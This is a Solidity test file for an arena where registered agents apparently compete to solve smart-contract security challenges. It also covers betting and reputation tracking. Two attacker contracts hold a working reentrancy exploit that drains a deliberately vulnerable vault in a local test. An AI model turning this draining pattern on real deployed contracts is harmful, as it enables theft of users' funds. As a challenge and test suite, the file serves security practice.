// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/AgentRegistry.sol";
import "../src/Challenges.sol";
import "../src/GladiatorArena.sol";

/// @title AttackerContract — Demonstrates a reentrancy exploit
contract ReentrancyAttacker {
    ReentrancyVault public vault;
    GladiatorArena public arena;
    uint256 public battleId;

    constructor(address _vault, address _arena, uint256 _battleId) payable {
        vault = ReentrancyVault(payable(_vault));
        arena = GladiatorArena(payable(_arena));
        battleId = _battleId;
    }

    function attack() external payable {
        // Deposit to get a balance
        vault.deposit{value: msg.value}();
        // Withdraw triggers reentrancy
        vault.withdraw();
    }

    // Reentrancy exploit — called when vault sends us ETH
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        } else {
            // Vault drained — submit solution to arena
            arena.submitSolution(battleId, address(vault), abi.encodeWithSignature("checkSolved()"));
        }
    }
}

contract SimpleAttacker {
    ReentrancyVault public vault;

    constructor(address payable _vault) {
        vault = ReentrancyVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}

contract GladiatorTest is Test {
    AgentRegistry registry;
    ChallengeFactory factory;
    GladiatorArena arena;

    address deployer = makeAddr("deployer");
    address agent1 = makeAddr("agent1");
    address agent2 = makeAddr("agent2");
    address spectator = makeAddr("spectator");

    function setUp() public {
        vm.startPrank(deployer);
        registry = new AgentRegistry();
        factory = new ChallengeFactory();
        arena = new GladiatorArena(address(registry), address(factory));
        registry.setArena(address(arena));
        vm.stopPrank();

        vm.deal(agent1, 10 ether);
        vm.deal(agent2, 10 ether);
        vm.deal(spectator, 10 ether);
        vm.deal(deployer, 10 ether);
    }

    function testRegisterAgent() public {
        vm.prank(agent1);
        registry.registerAgent{value: 0.01 ether}("Agent-Alpha", "ipfs://metadata");
        
        AgentRegistry.Agent memory agent = registry.getAgent(agent1);
        assertEq(agent.owner, agent1);
        assertEq(agent.name, "Agent-Alpha");
        assertEq(agent.stake, 0.01 ether);
        assertTrue(agent.isActive);
        assertGt(agent.reputation, 0);
    }

    function testCreateBattle() public {
        vm.prank(deployer);
        uint256 battleId = arena.createBattle{value: 0.001 ether}(0); // Reentrancy
        
        GladiatorArena.BattleInfo memory info = arena.getBattleInfo(battleId);
        assertEq(info.battleId, battleId);
        assertEq(info.challengeName, "Reentrancy Vault");
        assertEq(info.reward, 0.001 ether);
        assertFalse(info.resolved);
    }

    function testJoinBattle() public {
        // Register agent
        vm.prank(agent1);
        registry.registerAgent{value: 0.01 ether}("Agent-Alpha", "ipfs://metadata");

        // Create battle
        vm.prank(deployer);
        uint256 battleId = arena.createBattle{value: 0.001 ether}(0);

        // Join battle
        vm.prank(agent1);
        arena.joinBattle(battleId);

        address[] memory participants = arena.getParticipants(battleId);
        assertEq(participants.length, 1);
        assertEq(participants[0], agent1);
    }

    function testReentrancyExploit() public {
        // Deploy a standalone vault for testing
        ReentrancyVault vault = new ReentrancyVault{value: 0.001 ether}();
        
        // Simple reentrancy attacker
        SimpleAttacker attacker = new SimpleAttacker(payable(address(vault)));
        
        // Attack: deposit 0.001, then withdraw → reentrancy drains vault
        attacker.attack{value: 0.001 ether}();
        
        // Vault should be drained
        assertEq(address(vault).balance, 0);
    }

    function testPlaceBet() public {
        // Register agents
        vm.prank(agent1);
        registry.registerAgent{value: 0.01 ether}("Agent-Alpha", "ipfs://metadata");
        vm.prank(agent2);
        registry.registerAgent{value: 0.01 ether}("Agent-Beta", "ipfs://metadata");

        // Create battle
        vm.prank(deployer);
        uint256 battleId = arena.createBattle{value: 0.001 ether}(0);

        // Join battle
        vm.prank(agent1);
        arena.joinBattle(battleId);
        vm.prank(agent2);
        arena.joinBattle(battleId);

        // Place bet
        vm.prank(spectator);
        arena.placeBet{value: 0.05 ether}(battleId, agent1);

        assertEq(arena.agentBets(battleId, agent1), 0.05 ether);
    }

    function testMultipleBattles() public {
        // Create multiple battles (parallel on Monad)
        vm.prank(deployer);
        uint256 b1 = arena.createBattle{value: 0.001 ether}(0);
        vm.prank(deployer);
        uint256 b2 = arena.createBattle{value: 0.002 ether}(1);
        vm.prank(deployer);
        uint256 b3 = arena.createBattle{value: 0.001 ether}(2);

        assertEq(b1, 0);
        assertEq(b2, 1);
        assertEq(b3, 2);

        uint256[] memory active = arena.getActiveBattles();
        assertEq(active.length, 3);
    }

    function testReputationSystem() public {
        // Register agent
        vm.prank(agent1);
        registry.registerAgent{value: 0.01 ether}("Agent-Alpha", "ipfs://metadata");

        // Simulate a win
        vm.prank(address(arena));
        registry.updateStats(agent1, true, 0.001 ether);

        AgentRegistry.Agent memory a1 = registry.getAgent(agent1);
        assertEq(a1.wins, 1);
        
        // Simulate a loss
        vm.prank(address(arena));
        registry.updateStats(agent1, false, 0);

        AgentRegistry.Agent memory a2 = registry.getAgent(agent1);
        assertEq(a2.wins, 1);
        assertEq(a2.losses, 1);
        
        // Reputation should still be positive (stake * 100 > loss penalty)
        assertGt(a2.reputation, 0);
    }

    function testGetTopAgents() public {
        // Register multiple agents
        vm.prank(agent1);
        registry.registerAgent{value: 0.05 ether}("Agent-Alpha", "ipfs://metadata");
        vm.prank(agent2);
        registry.registerAgent{value: 0.01 ether}("Agent-Beta", "ipfs://metadata");

        // Alpha wins
        vm.prank(address(arena));
        registry.updateStats(agent1, true, 0.001 ether);
        vm.prank(address(arena));
        registry.updateStats(agent1, true, 0.002 ether);

        // Beta loses
        vm.prank(address(arena));
        registry.updateStats(agent2, false, 0);

        (address[] memory top, uint256[] memory reps) = registry.getTopAgents(2);
        assertEq(top[0], agent1); // Alpha should be #1
        assertGt(reps[0], reps[1]);
    }
}